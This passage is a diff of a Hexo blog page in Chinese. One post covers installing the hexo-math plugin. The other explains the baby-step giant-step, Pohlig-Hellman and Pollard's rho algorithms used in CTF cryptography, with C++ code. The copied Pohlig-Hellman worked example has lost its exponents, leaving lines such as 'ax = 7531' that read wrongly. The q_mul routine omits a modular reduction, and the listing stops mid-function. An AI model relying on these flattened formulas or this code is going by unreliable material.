@@ -333,6 +333,416 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/27/hexo使用hexo-math插件支持MathJax/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/27/hexo使用hexo-math插件支持MathJax/" itemprop="url">hexo使用hexo-math插件支持MathJax</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-27T11:57:57+08:00">
+                2018-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hexo搭建博客网站/" itemprop="url" rel="index">
+                    <span itemprop="name">Hexo搭建博客网站</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>MathJax是使用LaTeX方式输入数学公式的好工具。Hexo虽然可以直接使用mathjax，但是存在一些不方便之处。使用<a href="https://github.com/akfish/hexo-math" target="_blank" rel="external">hexo-math</a>这个插件可以大大方便使用。<br>使用Hexo 3.2.0，主题NexT 5.0.1，hexo-math 3.0.0安装方式如下</p>
+<p>在hexo安装目录下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-math --save</div></pre></td></tr></table></figure>
+<p>然后编辑站点根目录下的<code>_config.yml</code>，添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">math:</div><div class="line">  engine: &apos;mathjax&apos; # or &apos;katex&apos;</div><div class="line">  mathjax:</div><div class="line">    src: custom_mathjax_source</div><div class="line">    config:</div><div class="line">      # MathJax config</div></pre></td></tr></table></figure>
+<p>之后进入theme的目录，编辑主题的<code>_config.yml</code>，找到mathjax字段。NexT 5.0.1中默认mathjax是禁用，需要改成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mathjax:</div><div class="line">   enable: true</div></pre></td></tr></table></figure>
+<p>最后<code>hexo g</code>，就可以部署或者运行server查看效果了。</p>
+<hr>
+<p>几个测试例子<br>使用<code>$</code>的一行代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Simple inline $a = b + c$.</div></pre></td></tr></table></figure>
+<p>Simple inline $a=b+c$.</p>
+<p>使用<code>$$</code>的多行代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$$\frac&#123;\partial u&#125;&#123;\partial t&#125;</div><div class="line">= h^2 \left( \frac&#123;\partial^2 u&#125;&#123;\partial x^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial y^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial z^2&#125;\right)$$</div></pre></td></tr></table></figure>
+<p>$$\frac{\partial u}{\partial t}= h^2 \left( \frac{\partial^2 u}{\partial x^2} +\frac{\partial^2 u}{\partial y^2} +\frac{\partial^2 u}{\partial z^2}\right)$$</p>
+<p>使用Tag的块貌似不能用！！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这儿讲了一些细节：首先是不能直接用\\来当换行符，需要用\newline</div><div class="line">另外编辑公式的时候，不要使用* &#123;% math %&#125; 双大括号 等容易发生冲突的符号</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$$</div><div class="line">\left[</div><div class="line">    \begin&#123;array&#125;&#123;cc|c&#125;</div><div class="line">      1&amp;2&amp;3\newline</div><div class="line">      4&amp;5&amp;6</div><div class="line">    \end&#123;array&#125;</div><div class="line">\right] </div><div class="line">$$</div></pre></td></tr></table></figure>
+<p>$$<br>\left[<br>    \begin{array}{cc|c}<br>      1&amp;2&amp;3\newline<br>      4&amp;5&amp;6<br>    \end{array}<br>\right]<br>$$</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/26/常用于密码学中的算法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/26/常用于密码学中的算法/" itemprop="url">常用于密码学中的算法</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-26T13:44:56+08:00">
+                2018-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/crypto/" itemprop="url" rel="index">
+                    <span itemprop="name">crypto</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><p>最近做了不少密码学的题目，对于常见的RSA密钥攻击已经非常熟悉，但是对于比较特殊的密码学攻击手段，我却不甚清楚。下面主要讲解的是几种常见的算法。</p>
+<h3 id="0x1-baby-step-giant-step算法"><a href="#0x1-baby-step-giant-step算法" class="headerlink" title="0x1 baby step giant step算法"></a>0x1 baby step giant step算法</h3><p>baby step giant step算法常用于ACM竞赛中，该算法的目的是让$a^x=b(mod\ p)$ 求解的速度更快，核心是利用hash表查询的速度较普通查询方式快，当然同样是用空间换时间的一种思想。大概的时间复杂度$O(\sqrt{p}\ )$</p>
+<p>设$m=\lceil\sqrt{p}\ \rceil$</p>
+<p>那么可以设$x=i*m-j$</p>
+<p>所以原式等价于 $a^{i*m-j}=b(mod\ p) $</p>
+<p>也即 $(a^{m})^i=b*a^j$</p>
+<p>枚举$j$ (从0-m)，将$b*a^j$ 存入hash表中</p>
+<p>枚举i(范围1-m)，从hash表中寻找第一个满足$(a^{m})^i=b*a^j$ 的解</p>
+<p>此时$x=i*m-j$</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;ll,<span class="keyword">int</span>&gt;mp;</div><div class="line">ll p,a,b;</div><div class="line">ll n,m,now,ans,t;</div><div class="line"><span class="keyword">bool</span> flag;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fast_pow</span><span class="params">(ll x)</span></span></div><div class="line">&#123;</div><div class="line">    ll sum = <span class="number">1</span>;</div><div class="line">    ll aa = a;</div><div class="line">    <span class="keyword">while</span> (x&gt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (x&amp;<span class="number">1</span>) </div><div class="line">            sum = (sum*aa)%p;</div><div class="line">        x = x&gt;&gt;<span class="number">1</span>;</div><div class="line">        aa = (aa*aa)%p;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld"</span>,&amp;p,&amp;a,&amp;b)!=EOF)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(a%p==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        mp.clear();</div><div class="line">        m = <span class="built_in">ceil</span>(<span class="built_in">sqrt</span>(p));</div><div class="line">        flag = <span class="literal">false</span> ;</div><div class="line">        now = b%p;        <span class="comment">//b*a^j 当j==0时 </span></div><div class="line">        mp[now] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</div><div class="line">        &#123;</div><div class="line">            now = (now*a)%p;</div><div class="line">            mp[now] = i;</div><div class="line">        &#125;</div><div class="line">        t = fast_pow(m);</div><div class="line">        now = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)    <span class="comment">//枚举 (a^m)^i</span></div><div class="line">        &#123;</div><div class="line">            now = (now*t)%p;</div><div class="line">            <span class="keyword">if</span>(mp[now])</div><div class="line">            &#123;</div><div class="line">                flag = <span class="literal">true</span>;</div><div class="line">                ans = i*m-mp[now];</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,(ans%p+p)%p);    <span class="comment">//printf("%lld\n",(ans%p+p)%p);</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(!flag) <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x2-Pohlig-Hellman算法"><a href="#0x2-Pohlig-Hellman算法" class="headerlink" title="0x2 Pohlig-Hellman算法"></a>0x2 Pohlig-Hellman算法</h3><p>此算法应用于密码学中比bsgs算法更广，而且效果也更佳！（因为bsgs算法所能求解的p值不能太大，位数多了就不能在有限时间内跑完）</p>
+<p>原理： </p>
+<p>问题： 已知a,b,p,以及p-1的分解质因数，求x使得 $a^x=b(mod\ p)$</p>
+<p>设 $p-1=p_1^{e_1}*p_2^{e_2}...p_k^{e_k}$</p>
+<p>若能有 $k$ 组可用的等式  $x=x_i\ (mod\ p_i^{e_i})$ ，就可以用中国剩余定理求解出 $x(mod\ p-1)$ </p>
+<h4 id="2-1-求解-x-i"><a href="#2-1-求解-x-i" class="headerlink" title="2.1 求解$x_i$"></a>2.1 求解$x_i$</h4><p>对于 $p_i$ ，设   $x_i=c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}$ ，则  $x=x_i+s*p_i^{e_i}$</p>
+<p><strong>求解 $c_0$ ：</strong></p>
+<p>$b^{(p-1)/p_i}=(a^x)^{(p-1)/p_i}\ mod\ p$</p>
+<p>$=(a^{c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}+s*p_i^{e_i}})^{(p-1)/p_i} \ mod\ p$</p>
+<p>$=(a ^{c_0})^{(p-1)/p_i}\ mod\ p$</p>
+<p>由于 $b^{(p-1)/p_i}$ 已知， 而 $c_0$ 取值范围只在$[0,p_i-1]$ ，因而在 $p_i$ 不是特别大的时候，完全是可解的。</p>
+<p>有心的同学会发现，这个求解只需要在 $O(\lceil \sqrt{p_i} \rceil)$ 时间内就可求解，使用的仍是大步小步的思想。</p>
+<p>设 $m=\lceil \sqrt{p_i}\ \rceil $ ，$c_0 = u*m - v$</p>
+<p>则上式可表示为 $b^{(p-1)/p_i}*(a^{(p-1)/p_i})^v = (a^{m*(p-1)/p_i})^u$</p>
+<p>利用hash表可以快速求解出来！</p>
+<p><strong>求解 $c_i $ :</strong></p>
+<p>基于上面的表达式，我们可以快速求解出$c_0$ 等值，然后求解$c_1$ ，依次求解，最终可以将所有解求出来。</p>
+<p><strong>组合：</strong></p>
+<p>$x_i=c_0+c_1*p_i+c_2*p_i^2+...+c_{e_i-1}*p_i^{e_i-1}$</p>
+<h4 id="2-2-中国剩余定理求解x"><a href="#2-2-中国剩余定理求解x" class="headerlink" title="2.2 中国剩余定理求解x"></a>2.2 中国剩余定理求解x</h4><h4 id="2-3-范例"><a href="#2-3-范例" class="headerlink" title="2.3 范例"></a>2.3 范例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">Let the prime p = 8101, and a generator of Z8101 be a = 6. Find x so that</div><div class="line">ax = 7531 mod 8101.</div><div class="line"></div><div class="line">Observe that p-1 = 8100 = (22)(34)(52), is a product of small primes. We shall determine the numbers x2 = x mod (22), x3 = x mod (34) and x5 = x mod (52).</div><div class="line"></div><div class="line">Determination of x2.</div><div class="line">Since x2 is a number mod 4, we have x2 = c0 + c1 (2), with the coefficients being either 0 or 1. We determine these coefficients as follows.</div><div class="line">7531(p-1)/2 = 75314050 = -1 and as this = ac0 (p-1)/2, we have c0 = 1.</div><div class="line">Now, divide 7531 by ac0 to get</div><div class="line">7531(a-1) = 7531(6751) = 8006 mod p.</div><div class="line">8006(p-1)/4 = 80062025 = 1 and as this = ac1 (p-1)/2, we have c1 = 0.</div><div class="line"></div><div class="line">x2 = c0 + c1 (2) = 1 + 0(2) = 1.</div><div class="line"></div><div class="line">Determination of x3.</div><div class="line">Since x3 is a number mod 81, we have x3 = c0 + c1 (3) + c2 (9) + c3 (27), with the coefficients being either 0, 1 or 2. It will be of use to know the numbers a(p-1)/3 = 5883, and a2(p-1)/3 = 2217.</div><div class="line">7531(p-1)/3 = 2217, so c0 = 2.</div><div class="line">Now divide 7531 by ac0 to get</div><div class="line">7531(a-2) = 6735 mod p.</div><div class="line">6735(p-1)/9 = 1, so c1 = 0.</div><div class="line">Now divide 6735 by a3c1 to get</div><div class="line">6735(a0) = 6735 mod p.</div><div class="line">6735(p-1)/27 = 2217, so c2 = 2.</div><div class="line">Now divide 6735 by a9c2 to get</div><div class="line">6735(a-18) = 6992 mod p.</div><div class="line">6992(p-1)/81 = 5883, so c3 = 1.</div><div class="line"></div><div class="line">x3 = 2 + 0(3) + 2(9) + 1(27) = 47.</div><div class="line"></div><div class="line">Determination of x5.</div><div class="line">Since x5 is a number mod 25, x5 = c0 + c1 (5), with the coefficients being either 0, 1, 2, 3 or 4. We need to compute a(p-1)/5 = 3547, a2(p-1)/5 = 356, a3(p-1)/5 = 7077, a4(p-1)/5 = 5221.</div><div class="line">7531(p-1)/5 = 5221, so c0 = 4.</div><div class="line">Divide 7531 by ac0 to get</div><div class="line">7531(a-4) = 7613 mod p.</div><div class="line">7613(p-1)/25 = 356, so c1 = 2.</div><div class="line"></div><div class="line">x5 = 4 + 2(5) = 14.</div><div class="line"></div><div class="line">Determination of x.</div><div class="line">We now use the Chinese Remainder Theorem to compute the common solution of the congruences,</div><div class="line">x = 1 mod 4</div><div class="line">x = 47 mod 81</div><div class="line">x = 14 mod 25.</div><div class="line">M1 = 8100/(4) = 2025 </div><div class="line">y1 = M1-1 mod 4, y1 = 1.</div><div class="line">M2 = 8100/81 = 100</div><div class="line">y2 = M2-1 mod 81, y2 = 64.</div><div class="line"></div><div class="line">M3 = 8100/25 = 324</div><div class="line">y3 = M3-1 mod 25, y3 = 24.</div><div class="line"></div><div class="line">x = 1(2025)(1) + 47(100)(64) + 14(324)(24) = 6689 mod 8100.</div></pre></td></tr></table></figure>
+<p>上文转载于 <a href="http://www-math.ucdenver.edu/~wcherowi/courses/m5410/phexam.html" target="_blank" rel="external">Pohlig-Hellman范例</a></p>
+<h3 id="0x3-Pollard’s-rho算法"><a href="#0x3-Pollard’s-rho算法" class="headerlink" title="0x3 Pollard’s rho算法"></a>0x3 Pollard’s rho算法</h3><p>Pollard’s rho算法是一种常用的因数分解算法，对于分解因子较小的组合数特别有用。对于一个正整数n，在一般情况下，我们主要使用的是枚举1到n^(1/2)来求n的因子，所以算法复杂度是O(n^(1/2))。但是实际上有更好的办法，那就是Pollard&#39;s Rho算法，这个算法是一个随机化的算法，简单的说不是完全靠谱，一般我们认为它的平均算法复杂度是O(n^(1/4))。</p>
+<h4 id="3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率"><a href="#3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率" class="headerlink" title="3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率"></a>3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率</h4><p>我们随即地从[1,N]中选择一个数，这个数是 p 或者 q 的可能性是非常小的，所有我们不得不重复运行算法来提高概率。那么，我们现在可以提出一个不同的问题：<br>不再只选取一个整数，我们能够选取 𝑘 个数，并问是否存在𝑥𝑖 − 𝑥𝑗能够整除N</p>
+<p>当 $k=\sqrt{N}$ 时，可能性跳高到了50%</p>
+<p>策略：</p>
+<blockquote>
+<p>在区间[𝟐, 𝑵 − 𝟏]中随即选取 𝒌 个数，𝒙𝟏, … … , 𝒙𝒌<br>判断是否存在𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 , 𝑵) &gt; 𝟏, 若存在，𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 ,𝑵) 是𝑵的一个因子 ( 𝒑 或 𝒒 )</p>
+</blockquote>
+<p>但是很早就出现了一个问题，我们需要选取大约 𝑁^1/4 个数，<br>这个数量太大了，以至于我们并不能将其存放在内存中</p>
+<h4 id="3-2-Pollard‘s-rho算法详解"><a href="#3-2-Pollard‘s-rho算法详解" class="headerlink" title="3.2 Pollard‘s rho算法详解"></a>3.2 Pollard‘s rho算法详解</h4><p>为了解决数太多无法存储的问题，Pollard′s rho algorithm 只将两个数存放在内存中。</p>
+<p>我们并不随机生成 k 个数并两两进行比较，而是一个一个地生成并检查连续的两个数。反复执行这个步骤并希望能够得到我们想要的数。我们使用一个函数来生成伪随机数。换句话说，我们不断地使用函数 𝑓 来生成（看上去或者说感觉上像的）随机数。并不是所有的函都能够这样做，但是有一个神奇的函数可以。它就是</p>
+<p>$𝑓(𝑥) = ( 𝑥^2 + 𝑎 ) mod 𝑁$</p>
+<p>你可以发现对于大部分的数据这个算法能够正常运行，但是对于某些数据，它将会进入无限循环。为什么呢？这是因为存在 𝑓 环的原因。当它发生的时候，我们会在一个有限数集中进行无限循环。</p>
+<p>例如，我们可以构造一个伪随机函数并生成如下伪随机数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2, 10, 16, 23, 29, 13, 16, 23, 29, 13 … …</div></pre></td></tr></table></figure>
+<p>在这个例子中，我们最终将会在16, 23, 29, 13这个圈中无限循环，永远找不到因子。</p>
+<p>那么，<strong>如何探测环的出现呢？</strong></p>
+<p>一种方法是记录当前产生过的所有的数𝑥1, 𝑥2, … … 𝑥𝑛,并检测是否存在𝑥𝑙 = 𝑥𝑛(𝑙 &lt; 𝑛)。在实际过程中，当 𝑛 增长到一定大小时，可能会造成的内存不够用的情况。</p>
+<p>另一种方法是由Floyd发明的一个算法，我们举例来说明这个聪明而又有趣的算法。假设我们在一个很长很长的圆形轨道上行走，我们如何知道我们已经走完了一圈呢？当然，我们可以像第一种方法那样做，但是更聪明的方法是让 A 和 B 按照 B 的速度是A 的速度的两倍从同一起点开始往前走，当 B 第一次敢上 A 时(也就是我们常说的套圈)，我们便知道，B 已经走了至少一圈了。</p>
+<h4 id="3-3-算法实现"><a href="#3-3-算法实现" class="headerlink" title="3.3 算法实现"></a>3.3 算法实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  </span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> times = <span class="number">50</span>;</div><div class="line"><span class="keyword">int</span> number = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;m;</div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Random</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> ((<span class="keyword">double</span>)rand( ) / RAND_MAX*n + <span class="number">0.5</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_mul</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod )</span> <span class="comment">//快速乘法取模</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans += a;</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = (a + a) % mod;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_pow</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod 